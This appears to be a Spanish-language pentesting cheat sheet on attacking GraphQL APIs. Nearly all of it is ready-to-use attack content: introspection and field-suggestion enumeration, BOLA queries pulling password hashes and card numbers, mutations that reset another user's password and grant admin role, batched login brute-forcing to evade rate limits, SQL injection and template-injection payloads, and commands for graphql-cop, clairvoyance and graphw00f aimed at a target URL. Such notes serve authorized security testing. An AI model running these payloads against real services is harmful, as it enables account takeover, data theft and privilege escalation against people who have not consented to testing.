---
tags: [web, graphql, api]
status: done
---

# GraphQL

---

## Reconocimiento

```bash
# Endpoints comunes
/graphql
/api/graphql
/v1/graphql
/graphiql        # IDE interactivo (si está activo en prod → jackpot)
/playground

# Detección via Introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
```

---

## Introspection — Enumerar Schema

```graphql
# Schema completo
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
      }
    }
  }
}

# Queries disponibles
{
  __schema {
    queryType { fields { name description } }
    mutationType { fields { name description } }
  }
}
```

```bash
# graphql-voyager — visualizar schema como grafo
# Pegar resultado de introspection en https://ivangoncharov.github.io/graphql-voyager/

# InQL (Burp Extension) — genera automáticamente todas las queries del schema
```

---

## Queries de Explotación

```graphql
# Si introspection está desactivada → field suggestion (typosquatting)
{ user { pasword } }   # Respuesta: "Did you mean 'password'?"

# BOLA en GraphQL
{
  user(id: 2) {
    email
    password_hash
    credit_cards { number }
  }
}

# Consultar objeto admin
{
  user(role: "admin") {
    username
    password
  }
}
```

---

## Mutations Peligrosas

```graphql
# Cambiar contraseña de otro usuario
mutation {
  changePassword(userId: "victim-id", newPassword: "hacked123") {
    success
  }
}

# Escalada de privilegios
mutation {
  updateUser(id: "my-id", role: "admin") {
    role
  }
}
```

---

## Batching Attacks (Brute Force)

```graphql
# GraphQL permite múltiples queries en un array → bypass de rate limit
[
  {"query": "mutation { login(user: \"admin\", pass: \"pass1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"pass2\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"pass3\") { token } }"}
]
# Una sola request HTTP → múltiples intentos → rate limit no lo detecta
```

---

## SQLi / SSTI en Variables

```graphql
# Si los argumentos van a queries internas sin sanitizar
{
  user(username: "admin' OR '1'='1") {
    email
  }
}

{
  search(query: "{{7*7}}") {
    results
  }
}
```

---

## Herramientas

```bash
# InQL — Burp Extension (genera queries desde introspection)
# graphql-cop — auditoría de seguridad de GraphQL
python3 graphql-cop.py -t https://target.com/graphql

# clairvoyance — reconstruir schema sin introspection
python3 clairvoyance.py -u https://target.com/graphql -w wordlist.txt -o schema.json

# graphw00f — fingerprint de implementación GraphQL
python3 graphw00f.py -f -t https://target.com/graphql
```

